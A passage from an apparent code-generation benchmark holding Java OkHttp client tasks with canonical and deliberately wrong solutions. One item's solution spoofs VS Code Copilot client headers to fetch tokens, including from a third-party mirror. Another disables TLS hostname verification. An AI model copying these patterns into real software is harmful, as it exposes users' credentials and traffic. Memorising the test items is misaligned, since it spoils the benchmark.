    "Instruction": "Task Description: Create a Java class that implements a RESTful API client for expanding medical terminology value sets using the OkHttp library.\n\nClass Description: The TerminologyServiceClient class provides functionality to interact with a FHIR terminology service to expand value sets. It handles HTTP requests and responses, URL validation, and error handling.\n\nAttributes:\n- client: OkHttpClient - A shared HTTP client instance for making requests\n- urlValidator: UrlValidator - A validator for checking URL formats with support for double slashes\n- expandBaseUrl: String - The base URL for the value set expansion endpoint\n\nMethods:\n- setBaseUrl(String url) -> void - Sets the base URL for the terminology service by appending the value set expansion endpoint path\n- expandValueSet(String valueSetUri) -> Response - Makes a GET request to expand a value set, validates the input URI, and returns the HTTP response",
    "Canonical_solution": "import okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\nimport org.apache.commons.validator.routines.UrlValidator;\n\npublic class TerminologyServiceClient {\n    private static OkHttpClient client = new OkHttpClient();\n    private static UrlValidator urlValidator = new UrlValidator(UrlValidator.ALLOW_2_SLASHES);\n    private static String expandBaseUrl;\n\n    public static void setBaseUrl(String url) {\n        expandBaseUrl = url + \"/ValueSet/$expand?url=\";\n    }\n\n    public static Response expandValueSet(String valueSetUri) {\n        if (!urlValidator.isValid(valueSetUri)) {\n            throw new IllegalArgumentException(\"Invalid ValueSet URI\");\n        }\n\n        Request request = new Request.Builder()\n                .url(expandBaseUrl + valueSetUri)\n                .header(\"Accept\", \"application/json\")\n                .build();\n\n        try {\n            Response response = client.newCall(request).execute();\n            ResponseBody body = response.body();\n            if (body == null) {\n                throw new RuntimeException(\"Value Set Expansion contained no body\");\n            }\n            return response;\n        } catch (IOException e) {\n            throw new RuntimeException(\"Issue when expanding the value set\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "```java\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport org.apache.commons.validator.routines.UrlValidator;\n\npublic class TerminologyServiceClient {\n    private final OkHttpClient client;\n    private final UrlValidator urlValidator;\n    private String expandBaseUrl;\n\n    public TerminologyServiceClient() {\n        this.client = new OkHttpClient();\n        this.urlValidator = new UrlValidator(UrlValidator.ALLOW_LOCAL_URLS | UrlValidator.NO_FRAGMENTS);\n    }\n\n    public void setBaseUrl(String url) {\n        if (urlValidator.isValid(url)) {\n            this.expandBaseUrl = url + \"/ValueSet/$expand\";\n        } else {\n            throw new IllegalArgumentException(\"Invalid URL format: \" + url);\n        }\n    }\n\n    public Response expandValueSet(String valueSetUri) throws Exception {\n        if (!urlValidator.isValid(valueSetUri)) {\n            throw new IllegalArgumentException(\"Invalid value set URI: \" + valueSetUri);\n        }\n\n        Request request = new Request.Builder()\n                .url(expandBaseUrl + \"?url=\" + valueSetUri)\n                .build();\n\n        return client.newCall(request).execute();\n    }\n}\n```"
  },
  {
    "Task_id": 245,
    "Instruction": "Task Description: Create a Java class that implements a RESTful API client for interacting with GitHub Copilot and CoCoPilot services, including token retrieval and request execution capabilities.\n\nClass Description: The ApiClient class provides functionality to interact with GitHub Copilot and CoCoPilot APIs. It handles HTTP requests, manages headers, and processes responses. The class maintains a reusable HTTP client with configurable timeouts and generates unique identifiers for tracking requests.\n\nAttributes:\n- client: OkHttpClient - The HTTP client instance used for making requests\n- machineId: String - A unique identifier generated for the machine (static final)\n\nMethods:\n- ApiClient() -> None - Constructor that initializes the HTTP client with timeout configurations\n- generateMachineId() -> String - Generates a unique machine identifier using UUID (private static)\n- getCopilotToken(String apiKey) -> String - Retrieves a Copilot token using the provided API key\n- getCoCoToken(String apiKey) -> String - Retrieves a CoCoPilot token using the provided API key\n- executeRequest(String url, String method, String body, Map<String, String> headers) -> Response - Executes a generic HTTP request with specified parameters\n- createHeaders(String chatToken) -> Map<String, String> - Creates a standard set of headers for API requests using the provided chat token",
    "Canonical_solution": "import com.alibaba.fastjson2.JSON;\nimport okhttp3.*;\nimport org.json.JSONException;\nimport org.json.JSONObject;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\nimport java.util.concurrent.TimeUnit;\n\npublic class ApiClient {\n    private final OkHttpClient client;\n    private static final String machineId = generateMachineId();\n\n    public ApiClient() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(3, TimeUnit.MINUTES)\n                .readTimeout(5, TimeUnit.MINUTES)\n                .writeTimeout(5, TimeUnit.MINUTES)\n                .build();\n    }\n\n    private static String generateMachineId() {\n        return UUID.randomUUID().toString();\n    }\n\n    public String getCopilotToken(String apiKey) throws IOException {\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/copilot_internal/v2/token\")\n                .addHeader(\"Host\", \"api.github.com\")\n                .addHeader(\"authorization\", \"token \" + apiKey)\n                .addHeader(\"Editor-Version\", \"vscode/1.85.0\")\n                .addHeader(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\")\n                .addHeader(\"User-Agent\", \"GitHubCopilotChat/0.11.1\")\n                .addHeader(\"Accept\", \"*/*\")\n                .build();\n        \n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) {\n                return null;\n            }\n            String responseBody = response.body().string();\n            JSONObject jsonResponse = new JSONObject(responseBody);\n            return jsonResponse.has(\"token\") ? jsonResponse.get(\"token\").toString() : null;\n        } catch (JSONException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String getCoCoToken(String apiKey) throws IOException {\n        Request request = new Request.Builder()\n                .url(\"https://api.cocopilot.org/copilot_internal/v2/token\")\n                .addHeader(\"Host\", \"api.cocopilot.org\")\n                .addHeader(\"authorization\", \"token \" + apiKey)\n                .addHeader(\"Editor-Version\", \"vscode/1.85.0\")\n                .addHeader(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\")\n                .addHeader(\"User-Agent\", \"GitHubCopilotChat/0.11.1\")\n                .addHeader(\"Accept\", \"*/*\")\n                .build();\n        \n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) {\n                return null;\n            }\n            String responseBody = response.body().string();\n            JSONObject jsonResponse = new JSONObject(responseBody);\n            return jsonResponse.has(\"token\") ? jsonResponse.get(\"token\").toString() : null;\n        } catch (JSONException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public Response executeRequest(String url, String method, String body, Map<String, String> headers) throws IOException {\n        MediaType JSON = MediaType.get(\"application/json; charset=utf-8\");\n        RequestBody requestBody = RequestBody.create(body, JSON);\n        \n        Request.Builder requestBuilder = new Request.Builder()\n                .url(url);\n        \n        if (\"POST\".equalsIgnoreCase(method)) {\n            requestBuilder.post(requestBody);\n        } else if (\"GET\".equalsIgnoreCase(method)) {\n            requestBuilder.get();\n        }\n        \n        headers.forEach(requestBuilder::addHeader);\n        Request request = requestBuilder.build();\n        \n        return client.newCall(request).execute();\n    }\n\n    public Map<String, String> createHeaders(String chatToken) {\n        Map<String, String> headersMap = new HashMap<>();\n        headersMap.put(\"Host\", \"api.githubcopilot.com\");\n        headersMap.put(\"Accept-Encoding\", \"gzip, deflate, br\");\n        headersMap.put(\"Accept\", \"*/*\");\n        headersMap.put(\"Authorization\", \"Bearer \" + chatToken);\n        headersMap.put(\"X-Request-Id\", UUID.randomUUID().toString());\n        headersMap.put(\"X-Github-Api-Version\", \"2023-07-07\");\n        headersMap.put(\"Vscode-Sessionid\", UUID.randomUUID().toString() + System.currentTimeMillis());\n        headersMap.put(\"vscode-machineid\", machineId);\n        headersMap.put(\"Editor-Version\", \"vscode/1.85.0\");\n        headersMap.put(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\");\n        headersMap.put(\"Openai-Organization\", \"github-copilot\");\n        headersMap.put(\"Copilot-Integration-Id\", \"vscode-chat\");\n        headersMap.put(\"Openai-Intent\", \"conversation-panel\");\n        headersMap.put(\"User-Agent\", \"GitHubCopilotChat/0.11.1\");\n        return headersMap;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "OkHttpClient client = new OkHttpClient.Builder()\n        .connectTimeout(30, TimeUnit.SECONDS)\n        .readTimeout(30, TimeUnit.SECONDS)\n        .writeTimeout(30, TimeUnit.SECONDS)\n        .build();\n\n    private static final String machineId = generateMachineId();\n\n    private static String generateMachineId() {\n        return UUID.randomUUID().toString();\n    }\n\n    public String getCopilotToken(String apiKey) throws IOException {\n        String url = \"https://api.github.com/copilot/v1/token\";\n        String body = String.format(\"{\\\"device_id\\\":\\\"%s\\\"}\", machineId);\n        Map<String, String> headers = new HashMap<>();\n        headers.put(\"Authorization\", \"Bearer \" + apiKey);\n        headers.put(\"Content-Type\", \"application/json\");\n        Response response = executeRequest(url, \"POST\", body, headers);\n        if (response.isSuccessful()) {\n            return response.body().string();\n        } else {\n            throw new IOException(\"Failed to retrieve Copilot token: \" + response.code());\n        }\n    }\n\n    public String getCoCoToken(String apiKey) throws IOException {\n        String url = \"https://api.github.com/copilot/v2/token\";\n        String body = String.format(\"{\\\"device_id\\\":\\\"%s\\\"}\", machineId);\n        Map<String, String> headers = new HashMap<>();\n        headers.put(\"Authorization\", \"Bearer \" + apiKey);\n        headers.put(\"Content-Type\", \"application/json\");\n        Response response = executeRequest(url, \"POST\", body, headers);\n        if (response.isSuccessful()) {\n            return response.body().string();\n        } else {\n            throw new IOException(\"Failed to retrieve CoCoPilot token: \" + response.code());\n        }\n    }\n\n    public Response executeRequest(String url, String method, String body, Map<String, String> headers) throws IOException {\n        Request.Builder requestBuilder = new Request.Builder().url(url).method(method, body != null ? RequestBody.create(body, MediaType.get(\"application/json; charset=utf-8\")) : null);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            requestBuilder.addHeader(entry.getKey(), entry.getValue());\n        }\n        return client.newCall(requestBuilder.build()).execute();\n    }\n\n    private Map<String, String> createHeaders(String chatToken) {\n        Map<String, String> headers = new HashMap<>();\n        headers.put(\"Authorization\", \"Bearer \" + chatToken);\n        headers.put(\"X-GitHub-Device-ID\", machineId);\n        headers.put(\"Content-Type\", \"application/json\");\n        return headers;\n    }"
  },
  {
    "Task_id": 247,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests to a RESTful API using the OkHttp client library, with support for both GET and POST methods, including timeout configuration and proper resource cleanup.\n\nClass Description: GHMatrixBatchRequester is a utility class designed to make HTTP requests to a GraphHopper matrix API. It provides methods for sending GET and POST requests, handles response processing, and includes timeout configurations for network operations.\n\nAttributes:\n- logger: Logger - Used for logging debug and error information\n- client: OkHttpClient - The HTTP client instance used to make requests\n\nMethods:\n- Constructor: GHMatrixBatchRequester() -> void - Initializes the HTTP client with default timeout settings (5 seconds for connect and read)\n- Constructor: GHMatrixBatchRequester(OkHttpClient) -> void - Allows injection of a custom configured OkHttpClient instance\n- getJson: getJson(String url) -> JsonResult - Sends a GET request to the specified URL and returns the response as a JsonResult object containing the response body, status code, and headers\n- postJson: postJson(String url, JsonNode requestJson) -> JsonResult - Sends a POST request with JSON payload to the specified URL and returns the response as a JsonResult object containing the response body, status code, and headers",
    "Canonical_solution": "import com.fasterxml.jackson.databind.JsonNode;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.net.SocketTimeoutException;\nimport java.util.concurrent.TimeUnit;\n\nimport static com.graphhopper.api.GraphHopperWeb.X_GH_CLIENT_VERSION;\nimport static com.graphhopper.api.Version.GH_VERSION_FROM_MAVEN;\n\npublic class GHMatrixBatchRequester {\n\n    private final Logger logger = LoggerFactory.getLogger(getClass());\n    private OkHttpClient client;\n\n    public GHMatrixBatchRequester() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(5, TimeUnit.SECONDS)\n                .readTimeout(5, TimeUnit.SECONDS)\n                .build();\n    }\n\n    public GHMatrixBatchRequester(OkHttpClient client) {\n        this.client = client;\n    }\n\n    protected JsonResult getJson(String url) throws IOException {\n        Request okRequest = new Request.Builder().url(url)\n                .header(X_GH_CLIENT_VERSION, GH_VERSION_FROM_MAVEN)\n                .build();\n        ResponseBody body = null;\n        try {\n            Response rsp = client.newCall(okRequest).execute();\n            body = rsp.body();\n            return new JsonResult(body.string(), rsp.code(), rsp.headers().toMultimap());\n        } finally {\n            if (body != null) {\n                body.close();\n            }\n        }\n    }\n\n    protected JsonResult postJson(String url, JsonNode requestJson) throws IOException {\n        Request okRequest = new Request.Builder().url(url)\n                .header(X_GH_CLIENT_VERSION, GH_VERSION_FROM_MAVEN)\n                .post(createRequestBody(requestJson))\n                .build();\n        ResponseBody body = null;\n        try {\n            Response rsp = client.newCall(okRequest).execute();\n            body = rsp.body();\n            return new JsonResult(body.string(), rsp.code(), rsp.headers().toMultimap());\n        } finally {\n            if (body != null) {\n                body.close();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "public class GHMatrixBatchRequester {\n    private static final org.slf4j.Logger logger = org.slf4j.LoggerFactory.getLogger(GHMatrixBatchRequester.class);\n    private final okhttp3.OkHttpClient client;\n\n    public GHMatrixBatchRequester() {\n        this.client = new okhttp3.OkHttpClient.Builder()\n                .connectTimeout(5, java.util.concurrent.TimeUnit.SECONDS)\n                .readTimeout(5, java.util.concurrent.TimeUnit.SECONDS)\n                .build();\n    }\n\n    public GHMatrixBatchRequester(okhttp3.OkHttpClient client) {\n        this.client = client;\n    }\n\n    public JsonResult getJson(String url) {\n        okhttp3.Request request = new okhttp3.Request.Builder()\n                .url(url)\n                .build();\n\n        try (okhttp3.Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) {\n                logger.warn(\"GET request to {} failed with status code {}\", url, response.code());\n            }\n\n            String responseBody = response.body() != null ? response.body().string() : \"\";\n            return new JsonResult(responseBody, response.code(), response.headers());\n        } catch (Exception e) {\n            logger.error(\"Error occurred during GET request to {}\", url, e);\n            return new JsonResult(\"\", 500, new okhttp3.Headers.Builder().build());\n        }\n    }\n\n    public JsonResult postJson(String url, com.fasterxml.jackson.databind.JsonNode requestJson) {\n        okhttp3.MediaType JSON = okhttp3.MediaType.get(\"application/json; charset=utf-8\");\n        okhttp3.RequestBody body = okhttp3.RequestBody.create(requestJson.toString(), JSON);\n\n        okhttp3.Request request = new okhttp3.Request.Builder()\n                .url(url)\n                .post(body)\n                .build();\n\n        try (okhttp3.Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) {\n                logger.warn(\"POST request to {} failed with status code {}\", url, response.code());\n            }\n\n            String responseBody = response.body() != null ? response.body().string() : \"\";\n            return new JsonResult(responseBody, response.code(), response.headers());\n        } catch (Exception e) {\n            logger.error(\"Error occurred during POST request to {}\", url, e);\n            return new JsonResult(\"\", 500, new okhttp3.Headers.Builder().build());\n        }\n    }\n\n    public static class JsonResult {\n        private final String responseBody;\n        private final int statusCode;\n        private final okhttp3.Headers headers;\n\n        public JsonResult(String responseBody, int statusCode, okhttp3.Headers headers) {\n            this.responseBody = responseBody;\n            this.statusCode = statusCode;\n            this.headers = headers;\n        }\n\n        public String getResponseBody() {\n            return responseBody;\n        }\n\n        public int getStatusCode() {\n            return statusCode;\n        }\n\n        public okhttp3.Headers getHeaders() {\n            return headers;\n        }\n    }\n}"
  },
  {
    "Task_id": 248,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests using OkHttp library, supporting GET and POST methods with configurable headers, parameters, and retry mechanism.\n\nClass Description: HttpUtil is a utility class that provides static methods for making HTTP requests. It handles both GET and POST requests with support for headers, query parameters, and form parameters. The class includes built-in timeout settings and a retry mechanism for failed requests.\n\nAttributes:\n- QUESTION_SEPARATE: String - Constant for URL question mark separator\n- PARAM_SEPARATE: String - Constant for URL parameter separator\n- KV_SEPARATE: String - Constant for key-value separator in URLs\n- client: OkHttpClient - Pre-configured HTTP client instance with timeout settings\n\nMethods:\n- doGet(String url) -> Resp - Executes a GET request to the specified URL\n- doGetWithHeader(String url, Map<String, String> headers) -> Resp - Executes a GET request with custom headers\n- doGet(String url, Map<String, String> params) -> Resp - Executes a GET request with URL parameters\n- doPost(String url) -> Resp - Executes a POST request to the specified URL\n- doPost(String url, Map<String, String> params) -> Resp - Executes a POST request with form parameters\n- executeRequest(Request request, int retryTime) -> Resp - Internal method to execute requests with retry logic\n- bodyToString(ResponseBody body) -> String - Helper method to convert response body to string\n\nNested Class: Resp\n- Description: Represents the HTTP response with status code, body, and optional message\n- Attributes:\n  - code: int - HTTP status code\n  - body: String - Response body content\n  - message: String - Optional message (used for errors)\n- Methods:\n  - builder() -> RespBuilder - Creates a new RespBuilder instance\n  - getCode() -> int - Returns the status code\n  - getBody() -> String - Returns the response body\n  - getMessage() -> String - Returns the message\n\nNested Class: RespBuilder\n- Description: Builder pattern implementation for constructing Resp objects\n- Methods:\n  - code(int code) -> RespBuilder - Sets the status code\n  - body(String body) -> RespBuilder - Sets the response body\n  - message(String message) -> RespBuilder - Sets the message\n  - build() -> Resp - Constructs the Resp object",
    "Canonical_solution": "import okhttp3.*;\nimport org.apache.commons.collections4.MapUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.TimeUnit;\n\npublic class HttpUtil {\n\n    private static final String QUESTION_SEPARATE = \"?\";\n    private static final String PARAM_SEPARATE = \"&\";\n    private static final String KV_SEPARATE = \"=\";\n\n    private static final OkHttpClient client = new OkHttpClient().newBuilder()\n            .connectTimeout(3, TimeUnit.SECONDS)\n            .readTimeout(10, TimeUnit.SECONDS)\n            .writeTimeout(10, TimeUnit.SECONDS)\n            .build();\n\n    public static Resp doGet(String url) {\n        return executeRequest(new Request.Builder().get().url(url).build());\n    }\n\n    public static Resp doGetWithHeader(String url, Map<String, String> headers) {\n        final Request.Builder builder = new Request.Builder().get().url(url);\n        if (MapUtils.isNotEmpty(headers)) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                builder.header(entry.getKey(), entry.getValue());\n            }\n        }\n        return executeRequest(builder.build());\n    }\n\n    public static Resp doGet(String url, Map<String, String> params) {\n        StringBuilder builder = new StringBuilder(url);\n        if (!StringUtils.contains(url, QUESTION_SEPARATE)) {\n            builder.append(QUESTION_SEPARATE).append(\"_r=1\");\n        }\n        if (MapUtils.isNotEmpty(params)) {\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                builder.append(PARAM_SEPARATE)\n                        .append(entry.getKey())\n                        .append(KV_SEPARATE)\n                        .append(entry.getValue());\n            }\n        }\n        return doGet(builder.toString());\n    }\n\n    public static Resp doPost(String url) {\n        return doPost(url, null);\n    }\n\n    public static Resp doPost(String url, Map<String, String> params) {\n        FormBody.Builder builder = new FormBody.Builder();\n        if (MapUtils.isNotEmpty(params)) {\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                builder.add(entry.getKey(), entry.getValue());\n            }\n        }\n        Request request = new Request.Builder().post(builder.build()).url(url).build();\n        return executeRequest(request);\n    }\n\n    private static Resp executeRequest(Request request, int retryTime) {\n        try {\n            Response response = client.newCall(request).execute();\n            if (response.isSuccessful()) {\n                return Resp.builder().code(response.code())\n                        .body(bodyToString(response.body())).build();\n            }\n            if (--retryTime > 0) {\n                TimeUnit.MILLISECONDS.sleep(100);\n                return executeRequest(request, retryTime);\n            }\n            return Resp.builder().code(response.code())\n                    .body(bodyToString(response.body()))\n                    .message(\"Invoke failed, status code is not 200\")\n                    .build();\n        } catch (Exception e) {\n            if (--retryTime > 0) {\n                try {\n                    TimeUnit.MILLISECONDS.sleep(100);\n                } catch (InterruptedException e1) {\n                    // ignore\n                }\n                return executeRequest(request, retryTime);\n            }\n            return Resp.builder().code(500)\n                    .message(\"Invoke occurred exception, request=\" + request.toString() + \";message=\" + e.getMessage())\n                    .build();\n        }\n    }\n\n    private static String bodyToString(ResponseBody body) throws IOException {\n        return body == null ? \"\" : body.string();\n    }\n\n    public static class Resp {\n        private int code;\n        private String body;\n        private String message;\n\n        public static RespBuilder builder() {\n            return new RespBuilder();\n        }\n\n        public static class RespBuilder {\n            private int code;\n            private String body;\n            private String message;\n\n            public RespBuilder code(int code) {\n                this.code = code;\n                return this;\n            }\n\n            public RespBuilder body(String body) {\n                this.body = body;\n                return this;\n            }\n\n            public RespBuilder message(String message) {\n                this.message = message;\n                return this;\n            }\n\n            public Resp build() {\n                return new Resp(code, body, message);\n            }\n        }\n\n        Resp(int code, String body, String message) {\n            this.code = code;\n            this.body = body;\n            this.message = message;\n        }\n\n        public int getCode() {\n            return code;\n        }\n\n        public String getBody() {\n            return body;\n        }\n\n        public String getMessage() {\n            return message;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "public class HttpUtil {\n    public static final String QUESTION_SEPARATE = \"?\";\n    public static final String PARAM_SEPARATE = \"&\";\n    public static final String KV_SEPARATE = \"=\";\n    private static final OkHttpClient client = new OkHttpClient.Builder()\n            .connectTimeout(30, TimeUnit.SECONDS)\n            .readTimeout(30, TimeUnit.SECONDS)\n            .writeTimeout(30, TimeUnit.SECONDS)\n            .build();\n\n    public static Resp doGet(String url) {\n        return executeRequest(new Request.Builder().url(url).build(), 3);\n    }\n\n    public static Resp doGetWithHeader(String url, Map<String, String> headers) {\n        Request.Builder builder = new Request.Builder().url(url);\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                builder.addHeader(entry.getKey(), entry.getValue());\n            }\n        }\n        return executeRequest(builder.build(), 3);\n    }\n\n    public static Resp doGet(String url, Map<String, String> params) {\n        String fullUrl = url;\n        if (params != null && !params.isEmpty()) {\n            StringBuilder sb = new StringBuilder();\n            sb.append(QUESTION_SEPARATE);\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                sb.append(entry.getKey()).append(KV_SEPARATE).append(URLEncoder.encode(entry.getValue(), StandardCharsets.UTF_8)).append(PARAM_SEPARATE);\n            }\n            fullUrl += sb.substring(0, sb.length() - 1);\n        }\n        return executeRequest(new Request.Builder().url(fullUrl).build(), 3);\n    }\n\n    public static Resp doPost(String url) {\n        return executeRequest(new Request.Builder().url(url).post(RequestBody.create(\"\", MediaType.get(\"application/x-www-form-urlencoded\"))).build(), 3);\n    }\n\n    public static Resp doPost(String url, Map<String, String> params) {\n        FormBody.Builder formBuilder = new FormBody.Builder();\n        if (params != null) {\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                formBuilder.add(entry.getKey(), entry.getValue());\n            }\n        }\n        Request request = new Request.Builder().url(url).post(formBuilder.build()).build();\n        return executeRequest(request, 3);\n    }\n\n    private static Resp executeRequest(Request request, int retryTime) {\n        int attempts = 0;\n        while (attempts < retryTime) {\n            try {\n                Response response = client.newCall(request).execute();\n                if (response.isSuccessful()) {\n                    return Resp.builder()\n                            .code(response.code())\n                            .body(bodyToString(response.body()))\n                            .build();\n                } else {\n                    return Resp.builder()\n                            .code(response.code())\n                            .body(bodyToString(response.body()))\n                            .message(\"Request failed with code: \" + response.code())\n                            .build();\n                }\n            } catch (IOException e) {\n                attempts++;\n                if (attempts >= retryTime) {\n                    return Resp.builder()\n                            .code(500)\n                            .message(\"Request failed after \" + retryTime + \" retries: \" + e.getMessage())\n                            .build();\n                }\n            }\n        }\n        return Resp.builder()\n                .code(500)\n                .message(\"Request failed after \" + retryTime + \" retries\")\n                .build();\n    }\n\n    private static String bodyToString(ResponseBody body) {\n        try {\n            return body.string();\n        } catch (IOException e) {\n            return \"\";\n        }\n    }\n\n    public static class Resp {\n        private final int code;\n        private final String body;\n        private final String message;\n\n        private Resp(RespBuilder builder) {\n            this.code = builder.code;\n            this.body = builder.body;\n            this.message = builder.message;\n        }\n\n        public static RespBuilder builder() {\n            return new RespBuilder();\n        }\n\n        public int getCode() {\n            return code;\n        }\n\n        public String getBody() {\n            return body;\n        }\n\n        public String getMessage() {\n            return message;\n        }\n    }\n\n    public static class RespBuilder {\n        private int code;\n        private String body;\n        private String message;\n\n        public RespBuilder code(int code) {\n            this.code = code;\n            return this;\n        }\n\n        public RespBuilder body(String body) {\n            this.body = body;\n            return this;\n        }\n\n        public RespBuilder message(String message) {\n            this.message = message;\n            return this;\n        }\n\n        public Resp build() {\n            return new Resp(this);\n        }\n    }\n}"
  },
  {
    "Task_id": 249,
    "Instruction": "Task Description: Create a Java class for HTTP downloading with support for multi-threaded downloads, range requests, and connection pooling.\n\nClass Description: HttpDownloader is a Java class that extends InputStream to provide HTTP downloading capabilities. It supports multi-threaded downloads, range requests, connection pooling, and retry mechanisms. The class manages download tasks through a thread pool and handles response streaming efficiently.\n\nAttributes:\n\ncontentType: String - MIME type of the downloaded content\ncontentLength: long - Total size of the content being downloaded\ncontentEnd: long - Ending byte position for downloads\nheader: Headers - HTTP response headers\nstatusCode: int - HTTP status code\ndirectUrl: String - Final URL after redirects\ncurConnId: volatile static int - Connection counter\nclosed: volatile boolean - Flag indicating if downloader is closed\nconnId: int - Current connection ID\nis: InputStream - Current input stream\ncallableQueue: Queue<Callable<InputStream>> - Queue of download tasks\nfutureQueue: Queue<Future<InputStream>> - Queue of future results\ndownloaderMap: static HashMap<String, HttpDownloader> - Cache of active downloaders\nexecutorService: ExecutorService - Thread pool for download tasks\nsupportRange: boolean - Flag for server range support\nblockSize: int - Size of each download block (default 10MB)\nthreadNum: int - Number of download threads (default 2)\ncookie: String - Cookie header value\nreferer: String - Referer header value\nblockCounter: int - Counter for downloaded blocks\ndownloadClient: OkHttpClient - Custom HTTP client for downloads\ndefaultClient: OkHttpClient - Default HTTP client configuration\n\nMethods:\n\nHttpDownloader(Map<String, String> params) - Constructor - Initializes downloader with configuration parameters\ncreateDownloadTask(String url, Map<String, String> headers) - void - Creates download tasks based on range and thread configuration\ndownloadTask(String url, Map<String, String> headers, String range, int sliceNum) -> InputStream - Performs actual HTTP download\n_downloadTask(String url, Map<String, String> headers, String range, int sliceNum) -> InputStream - Internal download implementation\nread(byte[] buffer, int off, int len) -> int - Reads data from download stream\nread() -> int - Throws IOException (not implemented)\nclose() - void - Cleans up resources and stops downloads\nrunTask(int num) - void - Starts specified number of download tasks",
    "Canonical_solution": "import java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.Map;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.TreeMap;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\nimport java.util.Queue;\nimport java.util.LinkedList;\nimport java.util.regex.Pattern;\nimport java.util.regex.Matcher;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.Callable;\n\nimport okhttp3.OkHttpClient;\nimport okhttp3.Dispatcher;\nimport okhttp3.FormBody;\nimport okhttp3.RequestBody;\nimport okhttp3.Request;\nimport okhttp3.Headers;\nimport okhttp3.Response;\nimport okhttp3.Call;\nimport org.json.JSONObject;\n\npublic class HttpDownloader extends InputStream {\n    public String contentType = \"\";\n    public long contentLength = -1;\n    long contentEnd;\n    public Headers header;\n    public int statusCode = 200;\n    String directUrl = null;\n    volatile static int curConnId = 0;\n    volatile boolean closed = false;\n    int connId;\n    InputStream is = null;\n    Queue<Callable<InputStream>> callableQueue = new LinkedList<>();\n    Queue<Future<InputStream>> futureQueue = new LinkedList<>();\n    static HashMap<String, HttpDownloader> downloaderMap = new HashMap<>();\n    ExecutorService executorService = Executors.newFixedThreadPool(128);\n    boolean supportRange = true;\n    int blockSize = 10 * 1024 * 1024;\n    int threadNum = 2;\n    String cookie = null;\n    String referer = null;\n    int blockCounter = 0;\n    OkHttpClient downloadClient = null;\n    OkHttpClient defaultClient = new OkHttpClient.Builder()\n        .connectTimeout(30, TimeUnit.SECONDS)\n        .readTimeout(30, TimeUnit.SECONDS)\n        .writeTimeout(30, TimeUnit.SECONDS)\n        .hostnameVerifier((hostname, session) -> true)\n        .sslSocketFactory(new MySSLCompat(), MySSLCompat.TM)\n        .build();\n\n    public HttpDownloader(Map<String, String> params) {\n        Dispatcher dispatcher = new Dispatcher();\n        dispatcher.setMaxRequests(3000000);\n        dispatcher.setMaxRequestsPerHost(1000000);\n        downloadClient = defaultClient.newBuilder()\n            .dispatcher(dispatcher)\n            .connectTimeout(3, TimeUnit.SECONDS)\n            .readTimeout(3, TimeUnit.SECONDS)\n            .writeTimeout(3, TimeUnit.SECONDS)\n            .build();\n        \n        connId = curConnId++;\n        String url = params.get(\"url\");\n        downloaderMap.entrySet().removeIf(entry -> entry.getValue().closed);\n        HttpDownloader cacheDownloader = downloaderMap.get(url);\n        if (cacheDownloader != null) {\n            cacheDownloader.close();\n        }\n        downloaderMap.put(url, this);\n\n        if(params.get(\"thread\") != null){\n            threadNum = Integer.parseInt(params.get(\"thread\"));\n        }\n        if(params.get(\"size\") != null){\n            blockSize = Integer.parseInt(params.get(\"size\"));\n        }\n        if(params.get(\"cookie\") != null){\n            cookie = params.get(\"cookie\");\n        }\n\n        Map<String, String> headers = new TreeMap<>(String.CASE_INSENSITIVE_ORDER);\n        List<String> keys = Arrays.asList(\"referer\", \"icy-metadata\", \"range\", \"connection\", \"accept-encoding\", \"user-agent\", \"cookie\", \"authorization\");\n        for (String key : params.keySet()) if (keys.contains(key)) headers.put(key, params.get(key));\n        if(url.contains(\"\u5938\u514b\")) {\n            headers.put(\"user-agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) quark-cloud-drive/2.5.20 Chrome/100.0.4896.160 Electron/18.3.5.4-b478491100 Safari/537.36 Channel/pckk_other_ch\");\n        }\n        String range = \"\";\n        if (params.get(\"range\") != null) {\n            range = params.get(\"range\");\n        }\n        this.getHeader(url, 